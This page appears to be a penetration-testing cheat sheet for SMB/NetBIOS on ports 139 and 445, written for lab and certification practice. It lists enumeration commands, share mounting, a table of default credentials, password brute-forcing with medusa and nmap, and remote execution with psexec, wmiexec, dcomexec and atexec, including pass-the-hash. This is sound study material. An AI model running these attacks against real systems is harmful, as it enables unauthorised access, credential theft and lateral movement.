---
description: >-
  Grind through the list and pray that this often misconfigured service is still
  doing its vulnerable thang.
---

# Port 139, 445 : SMB/NetBIOS

**Versions**  
There are fairly significant differences between the versions of SMB, especially in the security realm.  As expected, v1 has extra routes to exploit, though this is often one of my favorite services to find, due to the many footholds available, the wealth of information and the path to exploit them is pretty easy.

SMB1 – Windows 2000, XP and Windows 2003.   
SMB2 – Windows Vista SP1 and Windows 2008   
SMB2.1 – Windows 7 and Windows 2008   
R2 SMB3 – Windows 8 and Windows 2012.  
  
There's a few methods you can use to get the SMB version:

```text
nmap --script="smb-os-discovery.nse" -v -p 139,445 10.10.10.14
Run wireshark or tcpdump, run smbmap -H <victim's IP>, follow the TCP stream of the SMB negotiation
 
```

**Tools to map the share, get users and other information**

```text
nbtscan -r 10.10.10.14
smbclient -N -L (TARGET IP)  [optional: -m SMB2, --no-pass -c 'recurse;ls'  to list recursively with smbclient]
nmblookup -A 10.10.10.14 [optional: -R (recursion) -W <workgroup name> -n <netbiosname>]
smbclient "\\\\(TARGET IP)\\IPC\$\\" -N -U (USER) -m SMB2  [if you have a username]
smbclient --user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\(TARGET IP ADDRESS)\\(TARGET SHARE)\\ (NTLM HASH)  [if you have an NTLM hash through impacket]
crackmapexec smb <IP> -u '' -p '' --shares  [no username] 
crackmapexec smb <IP> -u 'username' -p 'password' --shares [as guest] 
```

**Nmap**

```text
ls -la /usr/share/nmap/scripts/smb* 

nmap -v --script smb-os-discovery.nse -p 139,445 10.10.10.14 
nmap -v --script="smb-vuln*"  -p 139,445 10.10.10.14
nmap -v --script="smb*" -p 139,445 10.10.10.14
nmap -v --script="nbtstat.nse"  -p 139,445 10.10.10.14
nmap -sV -Pn -p 139,445    --script-args smbuser="<user>",smbpass="<password>" --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 
```

**RID Cycling**

```text
ridenum.py 10.10.10.88 500 50000 dict.txt 
msf > 
```

**Mounting SMB Shares**

```text
mount -t cifs -o username=user,password=password //<victim IP>/share /mnt/share 
smbclient -L //<IP>
smbclient //<IP>/IPC$ -N 
If share has a space in its name...
smbclient //<victim_ip>/<share\ name>  or smbclient //<victim_ip>/<"share name">

once mounted with smbclient, you can use "recurse ON", "prompt OFF" and "mget *" to download everything
```

**Metasploit Information Gathering Modules**

```text
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumusers_domain
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_ms17_010
```

**Metasploit script that checks for various vulnerabilities and gathers information**

```text
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc 
```

**\(Oftentimes, port 111, RPC, will be open along with this service\)**

```text
rpcclient -U "" -N 10.10.10.14
nmap --script="rpc*" 10.10.10.14

```

**After getting a list of users through enum4linux or other means, you can try to bruteforce the password:**

```text
medusa -h <victim_ip> -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt <victim_ip> -vvvv 

```

**Common Credentials:**

|  |  |
| ---: | :--- |
| \(blank\) | \(blank\)  |
| guest  | \(blank\)  |
| Administrator, admin  | \(blank\), password, administrator, admin  |
| arcserve  | arcserve, backup  |
| tivoli, tmersrvd  | tivoli, tmersrvd, admin  |
| backupexec, backup  | backupexec, backup, arcada  |
| test, lab, demo  | password, test, lab, demo  |

**Search for exploits**

```text
msf> search type:exploit platform:windows target:2008 smb 
searchsploit microsoft smb 
findsploit smb linux
```

**The following information is from Hacktricks and the very excellent enumeration guide located there:**

**PSexec and smbexec**  
Both options will create a new service \(using \pipe\svcctl via SMB\) in the victim machine and use it to execute something \(psexec will upload an executable file to ADMIN$ share and smbexec will point to cmd.exe/powershell.exe and put in the arguments the payload --file-less technique--\). More info about [psexec ](https://book.hacktricks.xyz/windows/ntlm/psexec-and-winexec)and [smbexec](https://book.hacktricks.xyz/windows/ntlm/smbexec). In kali it is located on /usr/share/doc/python3-impacket/examples/ 

\#If no password is provided, it will be prompted 

```text
./psexec.py [[domain/]username[:password]@]<targetName or address> 
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash 
psexec \\192.168.122.66 -u Administrator -p 123456Ww 
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```

_Using parameter-k you can authenticate against kerberos instead of NTLM_ 

​[**wmiexec**](https://book.hacktricks.xyz/windows/ntlm/wmicexec)**/dcomexec** 

Stealthily execute a command shell without touching the disk or running a new service using DCOM via port 135. In kali it is located on /usr/share/doc/python3-impacket/examples/ 

```text
#If no password is provided, it will be prompted 
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password 
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted 
```

Using parameter-k you can authenticate against kerberos instead of NTLM 

```text
#If no password is provided, it will be prompted 
./dcomexec.py [[domain/]username[:password]@]<targetName or address> 
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted 
```

​[**AtExec**](https://book.hacktricks.xyz/windows/ntlm/atexec)**​** 

Execute commands via the Task Scheduler \(using \pipe\atsvc via SMB\). In kali it is located on /usr/share/doc/python3-impacket/examples/ 

```text
./atexec.py [[domain/]username[:password]@]<targetName or address> "command" 
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```

